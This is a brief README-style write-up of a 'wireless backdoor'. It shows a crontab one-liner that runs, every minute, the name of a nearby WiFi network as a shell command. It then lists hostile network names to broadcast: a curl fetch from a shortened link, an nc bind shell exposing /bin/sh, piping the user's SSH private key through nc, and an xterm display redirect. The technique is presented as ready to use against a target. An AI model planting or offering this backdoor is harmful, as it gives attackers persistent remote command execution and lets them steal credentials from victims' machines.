Wireless backdoor
======================

"*...List available WiFi access points.  iface and bssid options can be used to get just APs for particular interface or specific AP, respectively....*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=I6kRJbxzcV4" target="_blank"><img src="http://img.youtube.com/vi/I6kRJbxzcV4/0.jpg" alt="Taking advantage of network-manager (nmcli backdoor)" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

echo "*/1 * * * * bash -c \"$(nmcli -f SSID dev wifi list | cut -f2 -d\' | egrep '^>' | cut -c2- | tail -n1)\"" | crontab

```

Now you can execute remote commands with your hotspot, create SSID names such as:
>curl -sL bit.ly/getouch
>nc -e /bin/sh -l 2222
>nc 127.0.0.1 20 < ~/.ssh/id_rsa
>xterm -display 127.0.0.1:1 &
(...)


**refs**

http://www.wirelessforums.org/alt-internet-wireless/ssid-33892.html


You don't need any connectivity from your target to run commands on their behalf! Use carefully! ;-)

